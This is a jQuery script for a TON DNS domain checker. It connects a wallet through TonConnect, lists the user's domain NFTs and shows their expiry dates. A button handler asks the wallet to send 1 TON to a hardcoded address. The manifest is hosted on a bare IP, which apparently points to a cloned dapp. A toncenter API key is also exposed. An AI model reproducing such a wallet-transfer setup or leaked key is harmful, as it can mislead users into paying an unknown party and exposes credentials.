$(document).ready(function() {
    var arrayForTable = [
        ["Domain name", "Expires"]
    ];

    async function transaction() {
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
            messages: [{
                address: "UQArAeDf7ms8325Rd2rPzEc_XErU1AQOK3qRaQHlAyxGUwJ0",
                amount: "1000000000",
                // stateInit: "base64bocblahblahblah==" // just for instance. Replace with your transaction initState or remove
            }]
        }
        try {
            const result = await tonConnectUI.sendTransaction(transaction);
        } catch (e) {
            console.error(e);
        }
    }

    $('#send-transaction').click(function() {
        transaction();
    });

    //original
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://193.232.179.102/tonconnect-manifest.json',
        buttonRootId: 'ton-connect'
    });

    function pause(delay) {
        var startTime = Date.now();

        while (Date.now() - startTime < delay);
    }

    const unsubscribe = tonConnectUI.onStatusChange(
        walletAndwalletInfo => {
            const currentWallet = tonConnectUI.wallet;
            const currentWalletInfo = tonConnectUI.walletInfo;
            const currentAccount = tonConnectUI.account;
            const currentIsConnectedStatus = tonConnectUI.connected;
            var arrayForTable = [
                ["Domain name", "Expires"]
            ]
            var exp = "Data error"

            if (currentIsConnectedStatus) {
                $('#img-loading').show();
                $('#connect-your-wlt').hide();
                const tonweb = new window.TonWeb();
                walletAddress = currentAccount['address']
                normWalletAddress = new tonweb.utils.Address(walletAddress).toString(true, true, true)

                $.getJSON('https://tonapi.io/v2/accounts/' + normWalletAddress + '/nfts?indirect_ownership=true', function(data) {
                    var arr = $.makeArray(data);
                    var i = 1

                    $.each(arr[0]['nft_items'], function(index, val) {
                        if (val['collection'] != null && val['collection']['name'] == 'TON DNS Domains') {
                            var name = val['dns']
                            var addr = val['address']
                            var norm_addr = new tonweb.utils.Address(addr).toString(true, true, true)
                            if (val['dns'].startsWith("xn--")) {
                                var pname = punycode.ToUnicode(name) + " (" + name + ")";
                                name = pname
                            }

                            var jData = { "address": norm_addr, "method": "get_last_fill_up_time", "stack": [] }
                            $.ajax({
                                url: 'https://toncenter.com/api/v2/runGetMethod',
                                method: 'post',
                                dataType: "json",
                                async: false,
                                contentType: "application/json",
                                headers: { "Content-Type": "application/json; charset=UTF-8", "X-API-Key": "e953a14514801edb6e4e6a53f78996a6132db4fb66edc62f4b61149b99d72658" },
                                data: JSON.stringify(jData),
                                success: function(data) {
                                    exp = parseInt(data['result']['stack'][0][1].slice(2), 16) + 366 * 24 * 60 * 60;
                                    var date = new Date(exp * 1000)
                                    var today = new Date();
                                    var partsdate = date.toLocaleDateString("en-EN").split('/');

                                    if (partsdate[0] < 10) {
                                        partsdate[0] = "0" + partsdate[0]
                                    }

                                    if (partsdate[1] < 10) {
                                        partsdate[1] = "0" + partsdate[1]
                                    }

                                    if (today > date) {
                                        exp = partsdate[2] + "-" + partsdate[0] + "-" + partsdate[1] + " EXPIRED!";
                                    } else {
                                        exp = partsdate[2] + "-" + partsdate[0] + "-" + partsdate[1]
                                    }
                                }
                            });

                            arrayForTable[i] = [name, exp]
                            exp = "Data error"
                            i++;

                        }
                    });

                    $('#img-loading').hide();

                    if (arrayForTable.length > 1) {
                        $('#domtotal').text("Total: " + (arrayForTable.length - 1));
                        $('#domtotal').show();
                        var table = arrayToTable(arrayForTable, {
                            thead: true,
                            attrs: { class: 'table' }
                        })

                        $('#domain-table').append(table);

                        $('th').click(function() {
                            var table = $(this).parents('table').eq(0)
                            var rows = table.find('tr:gt(0)').toArray().sort(comparer($(this).index()))
                            this.asc = !this.asc
                            if (!this.asc) { rows = rows.reverse() }
                            for (var i = 0; i < rows.length; i++) { table.append(rows[i]) }
                        })

                        function comparer(index) {
                            return function(a, b) {
                                var valA = getCellValue(a, index),
                                    valB = getCellValue(b, index)
                                return $.isNumeric(valA) && $.isNumeric(valB) ? valA - valB : valA.toString().localeCompare(valB)
                            }
                        }

                        function getCellValue(row, index) { return $(row).children('td').eq(index).text() }
                    } else {
                        $('#connect-your-wlt').children('p').text("Unfortunately, you don't have any domains. I advise you to purchase it as soon as possible!");
                        $('#connect-your-wlt').show();
                    }
                });
            } else if (currentIsConnectedStatus == false) {
                $('#domain-table').children('table').remove()
                $('#connect-your-wlt').children('p').text("Please connect your wallet to see the list of your domains");
                $('#domtotal').hide();
                $('#connect-your-wlt').show();
            }
        }
    );
    arrayToTable = function(data, options = {}) {

        var table = $('<table />'),
            rows = [],
            row,
            i, j

        // loop through all the rows, we will deal with tfoot and thead later
        for (i = 0; i < data.length; i++) {
            row = $('<tr />');
            for (j = 0; j < data[i].length; j++) {
                if (i == 0) {
                    row.append($('<th />').html(data[i][j]));
                } else {
                    row.append($('<td />').html(data[i][j]));
                }
            }
            rows.push(row);
        }

        // add all the rows
        for (i = 0; i < rows.length; i++) {
            table.append(rows[i]);
        };
        return table;
    }

    async function transaction() {
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
            messages: [{
                address: "UQArAeDf7ms8325Rd2rPzEc_XErU1AQOK3qRaQHlAyxGUwJ0",
                amount: "1000000000",
                // stateInit: "base64bocblahblahblah==" // just for instance. Replace with your transaction initState or remove
            }]
        }

        try {
            const result = await tonConnectUI.sendTransaction(transaction);
        } catch (e) {
            console.error(e);
        }
    }
    //origianal

    setTimeout(function() {
        $('#img-loading').hide();
        if (arrayForTable.length > 1) {
            $('#domtotal').text("Total: " + (arrayForTable.length - 1));
            $('#domtotal').show();
            var table = arrayToTable(arrayForTable, { thead: true, attrs: { class: 'table' } });
            $('#domain-table').append(table);
            $('th').click(function() {
                var table = $(this).parents('table').eq(0);
                var rows = table.find('tr:gt(0)').toArray().sort(comparer($(this).index()));
                this.asc = !this.asc;
                if (!this.asc) { rows = rows.reverse(); }
                for (var i = 0; i < rows.length; i++) { table.append(rows[i]); }
            });

            function comparer(index) {
                return function(a, b) {
                    var valA = getCellValue(a, index),
                        valB = getCellValue(b, index);
                    return $.isNumeric(valA) && $.isNumeric(valB) ? valA - valB : valA.toString().localeCompare(valB);
                };
            }

            function getCellValue(row, index) {
                return $(row).children('td').eq(index).text();
            }
        } else {
            $('#connect-your-wlt').children('p').text("Unfortunately, you don't have any domains. I advise you to purchase it as soon as possible!");
            $('#connect-your-wlt').show();
        }
    }, 5000);
});